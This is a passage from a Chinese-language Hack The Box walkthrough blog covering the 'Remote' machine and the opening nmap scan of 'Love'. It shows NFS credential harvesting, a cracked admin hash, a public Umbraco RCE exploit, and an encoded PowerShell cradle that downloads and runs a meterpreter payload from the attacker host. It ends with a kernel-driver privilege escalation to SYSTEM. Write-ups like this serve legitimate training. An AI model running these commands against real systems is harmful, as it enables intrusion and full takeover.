<span class="token number">49664</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49678</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49679</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49680</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">53739</span>/tcp filtered unknown
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">251.51</span> seconds</code></pre>

<p>首先尝试FTP(21)匿名登录，啥也没有，然后对NFS(2049)进行测试，发现网站备份文件，挂载后可以查找到admin凭证</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ showmount <span class="token parameter variable">-e</span> <span class="token number">10.10</span>.10.180              
Export list <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180:
/site_backups <span class="token punctuation">(</span>everyone<span class="token punctuation">)</span>
$ <span class="token function">mkdir</span> /tmp/site_backups 
$ <span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">10.10</span>.10.180:/site_backups /tmp/site_backups
$ <span class="token builtin class-name">cd</span> /tmp/site_backups 
$ <span class="token function">ls</span>
App_Browsers  aspnet_client  css           Media    Umbraco_Client
App_Data      bin            default.aspx  scripts  Views
App_Plugins   Config         Global.asax   Umbraco  Web.config
$ <span class="token builtin class-name">cd</span> App_Data 
strings Umbraco.sdf <span class="token operator">|</span> <span class="token function">grep</span> admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span><span class="token number">192.168</span>.195.1User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span>umbraco/user/password/changepassword change
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>

<p>将获取到的密码hash进行破解，将收集到的用户名密码备用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'b8be16afba8c314ad33d812f22a04991b90e2aaa'</span> <span class="token operator">></span> sha1  
$ john sha1 <span class="token parameter variable">--format</span><span class="token operator">=</span>Raw-SHA1 <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>Raw-SHA1 <span class="token punctuation">[</span>SHA1 <span class="token number">256</span>/256 AVX2 8x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider <span class="token parameter variable">--fork</span><span class="token operator">=</span><span class="token number">8</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
baconandcheese   <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-23 <span class="token number">21</span>:45<span class="token punctuation">)</span> <span class="token number">1</span>.694g/s 16650Kp/s 16650Kc/s 16650KC/s baconandchipies1<span class="token punctuation">..</span>bacon918
Use the <span class="token string">"--show --format=Raw-SHA1"</span> options to display all of the cracked passwords reliably
Session completed.                          </code></pre>

<p>添加本地域名解析到hosts文件，并访问站点，可以找到一个登录页面</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.180 remote.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<img src="/Hackthebox/htb/htb-remote/image-20250223220027043.png" class="" title="访问网站">

<p>使用收集到的用户名密码，登录网站，获取网站版本</p>
<img src="/Hackthebox/htb/htb-remote/image-20250223220241146.png" class="" title="登录页面">

<img src="/Hackthebox/htb/htb-remote/image-20250223220501688.png" class="" title="查看版本">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<a href="https://github.com/Jonoans/Umbraco-RCE">https://github.com/Jonoans/Umbraco-RCE</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python exploit.py <span class="token parameter variable">-u</span> admin@htb.local <span class="token parameter variable">-p</span> baconandcheese <span class="token parameter variable">-w</span> <span class="token string">'http://remote.htb'</span> <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.16.30
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4444</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49695</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4445</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4445: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49696</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span> <span class="token function">whoami</span>
iis apppool<span class="token punctuation">\</span>defaultapppool
PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span>  </code></pre>

<p>将shell 转移到msfconsole：使用<code>multi/script/web_delivery</code> 复制生成的powershell链接，在获取到的shell 上执行，成功获取到shell，查看系统信息为 Windows Server 2019 (10.0 Build 17763)</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Id  Name
    --  ----
<span class="token operator">=</span><span class="token operator">></span>  <span class="token number">0</span>   Python
    <span class="token number">1</span>   PHP
    <span class="token number">2</span>   PSH
    <span class="token number">3</span>   Regsvr32
    <span class="token number">4</span>   pubprn
    <span class="token number">5</span>   SyncAppvPublishingServer
    <span class="token number">6</span>   PSH <span class="token punctuation">(</span>Binary<span class="token punctuation">)</span>
    <span class="token number">7</span>   Linux
    <span class="token number">8</span>   Mac OS X


msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> target <span class="token number">2</span>
target <span class="token operator">=</span><span class="token operator">></span> <span class="token number">2</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/meterpreter/reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4446</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4446</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> SRVPORT <span class="token number">8088</span>
SRVPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8088</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4446 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://10.10.16.30:8088/1JHqco9l
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the following <span class="token builtin class-name">command</span> on the target machine:
powershell.exe <span class="token parameter variable">-nop</span> <span class="token parameter variable">-w</span> hidden <span class="token parameter variable">-e</span> <span class="token assign-left variable">WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AG4AVABYAGcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBuAFQAWABnAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBuAFQAWABnAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAvAEUATABkAEkAMgBNAFUAUwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAnACkAKQA7AA</span><span class="token operator">==</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering AMSI Bypass <span class="token punctuation">(</span><span class="token number">1383</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering Payload <span class="token punctuation">(</span><span class="token number">3703</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49698<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:07:25 +0800

msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions 

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  <span class="token number">1</span>         meterpreter x64/windows  IIS APPPOOL<span class="token punctuation">\</span>DefaultAppPool @  <span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.
                                      REMOTE                       <span class="token number">180</span>:49698 <span class="token punctuation">(</span><span class="token number">10.10</span>.10.180<span class="token punctuation">)</span>

msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token parameter variable">-i</span> <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.

meterpreter <span class="token operator">></span> sysinfo 
Computer        <span class="token builtin class-name">:</span> REMOTE
OS              <span class="token builtin class-name">:</span> Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">17763</span><span class="token punctuation">)</span>.
Architecture    <span class="token builtin class-name">:</span> x64
System Language <span class="token builtin class-name">:</span> en_US
Domain          <span class="token builtin class-name">:</span> WORKGROUP
Logged On Users <span class="token builtin class-name">:</span> <span class="token number">0</span>
Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>post/multi/recon/local_exploit_suggester</code>  收集信息，查找可以提权的脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> use post/multi/recon/local_exploit_suggester 
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows <span class="token number">10</span> v1809 build was detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></code></pre>

<p>根据查找结果使用 <code>windows/local/cve_2024_35250_ks_driver</code> 进行提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">3</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">7777</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">7777</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:7777 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching notepad to <span class="token function">host</span> the exploit<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad path is: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>notepad.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad pid is: <span class="token number">4628</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">4628</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">4</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:7777 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49703<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:26:34 +0800

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
meterpreter <span class="token operator">></span> 
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Public\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Love</title>
    <url>/Hackthebox/htb/htb-love/</url>
    <content><![CDATA[<style>.bbnserieyprb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="bbnserieyprb">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash"> nmap <span class="token number">10.10</span>.10.239 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">11</span>:34 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.239
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE      VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">((</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span>_http-title: Voting System using PHP
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http     Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>staging.love.htb/organizationName<span class="token operator">=</span>ValentineCorp/stateOrProvinceName<span class="token operator">=</span>m/countryName<span class="token operator">=</span>in
<span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-01-18T14:00:16
<span class="token operator">|</span>_Not valid after:  <span class="token number">2022</span>-01-18T14:00:16
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: <span class="token number">400</span> Bad Request
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds Windows <span class="token number">10</span> Pro <span class="token number">19042</span> microsoft-ds <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
<span class="token number">3306</span>/tcp  <span class="token function">open</span>  mysql        MariaDB <span class="token number">10.3</span>.24 or later <span class="token punctuation">(</span>unauthorized<span class="token punctuation">)</span>
<span class="token number">5000</span>/tcp  <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token operator">|</span>_http-title: <span class="token number">403</span> Forbidden
<span class="token number">5040</span>/tcp  <span class="token function">open</span>  unknown
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">5986</span>/tcp  <span class="token function">open</span>  ssl/http     Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>LOVE
<span class="token operator">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
<span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-04-11T14:39:19
<span class="token operator">|</span>_Not valid after:  <span class="token number">2024</span>-04-10T14:39:19
<span class="token operator">|</span>_ssl-date: <span class="token number">2025</span>-02-22T03:43:45+00:00<span class="token punctuation">;</span> +4m16s from scanner time.
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token number">7680</span>/tcp  <span class="token function">open</span>  pando-pub?
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
